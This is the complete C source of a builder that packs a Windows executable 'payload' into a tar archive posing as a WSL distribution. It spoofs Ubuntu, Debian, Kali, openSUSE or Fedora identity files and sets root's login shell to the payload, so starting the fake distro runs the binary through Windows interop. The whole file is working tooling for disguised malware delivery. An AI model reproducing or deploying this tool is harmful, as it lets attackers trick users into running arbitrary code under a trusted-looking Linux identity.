#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

static uint8_t *read_file(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) { fprintf(stderr, "[-] Cannot open: %s\n", path); return NULL; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    rewind(f);
    if (sz <= 0) { fclose(f); return NULL; }
    uint8_t *buf = malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf); fclose(f); return NULL;
    }
    fclose(f);
    *out_len = (size_t)sz;
    return buf;
}

typedef struct { uint8_t *data; size_t len; size_t cap; } Buf;

static void buf_init(Buf *b) { b->data = NULL; b->len = 0; b->cap = 0; }

static int buf_grow(Buf *b, size_t need) {
    if (b->len + need <= b->cap) return 1;
    size_t nc = b->cap ? b->cap * 2 : 65536;
    while (nc < b->len + need) nc *= 2;
    uint8_t *np = realloc(b->data, nc);
    if (!np) return 0;
    b->data = np; b->cap = nc;
    return 1;
}

static void buf_append(Buf *b, const void *src, size_t n) {
    if (!buf_grow(b, n)) { fprintf(stderr, "[-] OOM\n"); exit(1); }
    memcpy(b->data + b->len, src, n);
    b->len += n;
}

static void buf_free(Buf *b) {
    free(b->data); b->data = NULL; b->len = b->cap = 0;
}

static uint32_t tar_checksum(const uint8_t hdr[512]) {
    uint32_t s = 8 * ' ';
    for (int i = 0; i < 512; i++) {
        if (i >= 148 && i < 156) continue;
        s += hdr[i];
    }
    return s;
}

static void tar_octal(uint8_t *field, size_t width, uint64_t val) {
    char tmp[32];
    snprintf(tmp, sizeof(tmp), "%0*llo", (int)(width - 1), (unsigned long long)val);
    memcpy(field, tmp, width - 1);
    field[width - 1] = 0;
}

static void tar_dir(Buf *b, const char *name) {
    uint8_t hdr[512];
    memset(hdr, 0, 512);
    strncpy((char*)hdr, name, 99);
    tar_octal(hdr + 100, 8, 0755);
    tar_octal(hdr + 108, 8, 0);
    tar_octal(hdr + 116, 8, 0);
    tar_octal(hdr + 124, 12, 0);
    tar_octal(hdr + 136, 12, 0);
    hdr[156] = '5';
    memcpy(hdr + 257, "ustar  ", 8);
    uint32_t cs = tar_checksum(hdr);
    snprintf((char*)(hdr + 148), 8, "%06o", cs);
    hdr[154] = ' '; hdr[155] = '\0';
    buf_append(b, hdr, 512);
}

static void tar_file(Buf *b, const char *name, const uint8_t *data,
                     size_t len, uint32_t mode) {
    uint8_t hdr[512];
    memset(hdr, 0, 512);
    strncpy((char*)hdr, name, 99);
    tar_octal(hdr + 100, 8, mode);
    tar_octal(hdr + 108, 8, 0);
    tar_octal(hdr + 116, 8, 0);
    tar_octal(hdr + 124, 12, len);
    tar_octal(hdr + 136, 12, 0);
    hdr[156] = '0';
    memcpy(hdr + 257, "ustar  ", 8);
    uint32_t cs = tar_checksum(hdr);
    snprintf((char*)(hdr + 148), 8, "%06o", cs);
    hdr[154] = ' '; hdr[155] = '\0';
    buf_append(b, hdr, 512);
    buf_append(b, data, len);
    size_t pad = (512 - (len % 512)) % 512;
    if (pad) {
        uint8_t zeros[512] = {0};
        buf_append(b, zeros, pad);
    }
}

static void tar_end(Buf *b) {
    uint8_t z[1024] = {0};
    buf_append(b, z, 1024);
}

typedef struct {
    const char *id;
    const char *display_name;
    const char *distro_name;
    const char *os_id;
    const char *os_pretty;
} DistroProfile;

static const DistroProfile DISTROS[] = {
    { "ubuntu2204", "Ubuntu 22.04.3 LTS",   "Ubuntu-22.04",       "ubuntu",        "Ubuntu 22.04.3 LTS"               },
    { "ubuntu2004", "Ubuntu 20.04.6 LTS",   "Ubuntu-20.04",       "ubuntu",        "Ubuntu 20.04.6 LTS"               },
    { "debian",     "Debian GNU/Linux",      "Debian",             "debian",        "Debian GNU/Linux 12 (bookworm)"   },
    { "kali",       "Kali Linux Rolling",    "kali-linux",         "kali",          "Kali GNU/Linux Rolling"           },
    { "opensuse",   "openSUSE Leap 15.5",    "openSUSE-Leap-15.5", "opensuse-leap", "openSUSE Leap 15.5"               },
    { "fedora",     "Fedora Linux 39",       "FedoraLinux-39",     "fedora",        "Fedora Linux 39 (Container Image)"},
};
#define N_DISTROS (int)(sizeof(DISTROS)/sizeof(DISTROS[0]))

static const DistroProfile *get_distro(const char *id) {
    for (int i = 0; i < N_DISTROS; i++)
        if (strcmp(DISTROS[i].id, id) == 0) return &DISTROS[i];
    return NULL;
}

static void build_rootfs_tar(
        Buf *tar,
        const uint8_t *payload, size_t payload_len,
        const char *payload_name,
        const DistroProfile *dp)
{
    const char *dirs[] = {
        "./", "./bin/", "./dev/", "./etc/", "./home/",
        "./lib/", "./lib64/", "./proc/", "./root/",
        "./run/", "./sys/", "./tmp/", "./usr/", "./usr/bin/",
        "./usr/lib/", "./var/", "./var/log/", NULL
    };
    for (int i = 0; dirs[i]; i++) tar_dir(tar, dirs[i]);

    char os_rel[512];
    snprintf(os_rel, sizeof(os_rel),
        "NAME=\"%s\"\nID=%s\nPRETTY_NAME=\"%s\"\n"
        "HOME_URL=\"https://www.ubuntu.com/\"\n"
        "SUPPORT_URL=\"https://help.ubuntu.com/\"\n",
        dp->display_name, dp->os_id, dp->os_pretty);
    tar_file(tar, "./etc/os-release", (uint8_t*)os_rel, strlen(os_rel), 0644);

    char wsl_dist_conf[256];
    snprintf(wsl_dist_conf, sizeof(wsl_dist_conf),
        "[oobe]\ndefaultName=%s\ndefaultUid=0\n",
        dp->distro_name);
    tar_file(tar, "./etc/wsl-distribution.conf",
             (uint8_t*)wsl_dist_conf, strlen(wsl_dist_conf), 0644);

    const char *wsl_conf =
        "[automount]\nenabled=true\nroot=/mnt/\n"
        "options=\"metadata,umask=22,fmask=11\"\nmountFsTab=false\n\n"
        "[interop]\nenabled=true\nappendWindowsPath=false\n\n"
        "[user]\ndefault=root\n";
    tar_file(tar, "./etc/wsl.conf", (uint8_t*)wsl_conf, strlen(wsl_conf), 0644);

    char passwd[256];
    snprintf(passwd, sizeof(passwd),
        "root:x:0:0:root:/root:/root/%s\n"
        "nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin\n",
        payload_name);
    tar_file(tar, "./etc/passwd", (uint8_t*)passwd, strlen(passwd), 0644);

    const char *shadow = "root:*:19000:0:99999:7:::\n";
    const char *group  = "root:x:0:\nnogroup:x:65534:\n";
    tar_file(tar, "./etc/shadow", (uint8_t*)shadow, strlen(shadow), 0640);
    tar_file(tar, "./etc/group",  (uint8_t*)group,  strlen(group),  0644);

    const char *hnames[] = { "wsl-desktop", "wsl-host", "wsl-dev", "wsl-box" };
    srand((unsigned)time(NULL));
    char hostname[32];
    snprintf(hostname, sizeof(hostname), "%s\n", hnames[rand() % 4]);
    tar_file(tar, "./etc/hostname", (uint8_t*)hostname, strlen(hostname), 0644);

    tar_file(tar, "./etc/fstab", (uint8_t*)"", 0, 0644);

    char payload_path_in_tar[256];
    snprintf(payload_path_in_tar, sizeof(payload_path_in_tar), "./root/%s", payload_name);
    tar_file(tar, payload_path_in_tar, payload, payload_len, 0755);

    tar_end(tar);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr,
            "Usage: %s <payload> <payload_name> <distro_id> <output>\n"
            "  distro_id : ubuntu2204 | ubuntu2004 | debian | kali | opensuse | fedora\n",
            argv[0]);
        return 1;
    }

    const char *payload_path = argv[1];
    const char *payload_name = argv[2];
    const char *distro_id    = argv[3];
    const char *output_path  = argv[4];

    const DistroProfile *dp = get_distro(distro_id);
    if (!dp) {
        fprintf(stderr, "[-] Unknown distro id: %s\n", distro_id);
        return 1;
    }

    size_t payload_len;
    uint8_t *payload = read_file(payload_path, &payload_len);
    if (!payload) return 1;

    if (payload_len < 2 || memcmp(payload, "MZ", 2) != 0) {
        fprintf(stderr, "[-] Not a PE binary (missing MZ magic)\n");
        free(payload); return 1;
    }

    fprintf(stderr, "[*] Building rootfs...\n");

    Buf tar;
    buf_init(&tar);
    build_rootfs_tar(&tar, payload, payload_len, payload_name, dp);
    free(payload);

    fprintf(stderr, "[*] Rootfs tar: %zu bytes\n", tar.len);

    FILE *out = fopen(output_path, "wb");
    if (!out) {
        fprintf(stderr, "[-] Cannot write: %s\n", output_path);
        buf_free(&tar); return 1;
    }
    size_t written = fwrite(tar.data, 1, tar.len, out);
    fclose(out);

    size_t final_size = tar.len;
    buf_free(&tar);

    fprintf(stderr, "[+] Written: %s (%zu bytes)\n", output_path, final_size);
    if (written != final_size)
        fprintf(stderr, "[-] Warning: only %zu of %zu bytes written\n", written, final_size);
    fprintf(stderr, "[+] Identity : %s  (wsl -l name: %s)\n", dp->display_name, dp->distro_name);
    fprintf(stderr, "[+] Payload  : /root/%s\n", payload_name);

    return 0;
}
